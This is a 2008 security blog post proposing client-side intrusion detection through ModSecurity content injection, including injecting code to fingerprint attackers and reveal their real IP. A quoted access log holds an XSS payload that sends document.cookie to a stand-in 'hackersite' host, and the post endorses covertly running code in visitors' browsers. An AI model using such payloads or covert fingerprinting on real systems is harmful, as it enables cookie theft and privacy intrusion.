---
title: Content Injection - Hack the Hacker
author: david-kierznowski
date: Fri, 11 Apr 2008 13:52:19 GMT
template: post.pug
category: fucked
---

Traditional IDS/IPS systems occur at the network level, usually plugged into a spanning port on a switch. I love this concept and think it should be part of any defense in depth strategy. The two primary weaknesses in these devices are, (1) they cannot process encrypted streams and (2) they can often be circumvented with a little creativity. In this post I want to discuss using Client-Side IDS (C-IDS) for more advanced attack detection.

I don't know how realistic this would be but it could be fun concept to investigate. Imagine setting up modules on your reverse proxy. As user visits the site, different modules could get launched during different requests. One module could detect a user's browser plugins. One module could detect Tor and other services with Tor. Put the results into a hashing algorithm and you have a semi-unique client fingerprint regardless of IP address (although privacy laws could restrict these kinds of requests). OR, our reverse proxy could inject random code snippets of defense, overwriting and hijacking JavaScript functions (i.e. alert) with our own action (i.e. logging, blocking etc). Check out some of Mario's code snippets of defense for the idea: [here](/blog/snippets-of-defense-pti/), [here](/blog/snippets-of-defense-ptii/), [here](/blog/snippets-of-defense-ptiii/), and [here](/blog/snippets-of-defense-ptiv/)

So what benefits would a client-side IDS (C-IDS) provide?

* Client side code is interoperable. This means it can be rapidly deployed across any number of networks;
* Client side code works over encrypted sessions. We don't need to worry about SSL termination issues and reading into encrypted sessions;
* Client side code allows us to hook into the user's browser where the attacks are happening. This gives us greater control and the possibility to detect advanced anti-filter attacks (obfuscation & polymorphism.);
* Client side code allows us to attack the attacker. We could execute code to determine if the attacker is using Tor or any number of browser-related variables.

Basically, the same engine discussed for Web 2.0 worms could theoritically be used as an additional **defense in depth** tool. The latest version of [ModSecurity (2.5)](http://modsecurity.org/projects/modsecurity/apache/feature_content_injection.html) allows two new rules, `"prepend"` or `"append"`. These rules allow us to insert HTML/text into our HTTP responses. This type of flexability opens an entire range of doors. Great stuff guys! Here's an example from ModSecurity Content Injection article:

The following rule uses the same data as the previous example, except this time, instead of simply sending an alert pop-up box we are sending the `MyAddress.class` java applet. This code will force the attacker's browser to initiate a connection back to our web server.

	SecRule TX:ALERT "@eq 1" "phase:3,nolog,pass,chain,prepend:''"
	SecRule RESPONSE_CONTENT_TYPE "^text/html"

So, if an attacker sends a malicious request that ModSecurity triggers on, this rule will then fire and it will send the injected code to the client. Our Apache access_logs will show data similar to this:
 
	203.160.1.47 - - [20/Jan/2008:21:15:03 -0500] "GET /cgi-bin/foo.cgi?param=%3Cscript%3Edocument.write('%3Cimg%20src=%22http://hackersite/'+document.cookie+'%22')%3C/script%3E HTTP/1.1" 500 676
	203.160.1.47 - - [20/Jan/2008:21:15:03 -0500] "GET /cgi-bin/grab_ip.php?IP=222.141.50.175 HTTP/1.1" 404 207

As you can see, even though the IP address in the access_logs shows `203.160.1.47`, the data returned in the `QUERY_STRING` portion of the second line shows that the real IP address of the attacker is `222.141.50.175`. This would mean that in this case, the attacker's system was not on a private network (perhaps just connecting their computer directly to the internet). `Attacker's computer -> Proxy -> Proxy -> etc... -> Target Website`.
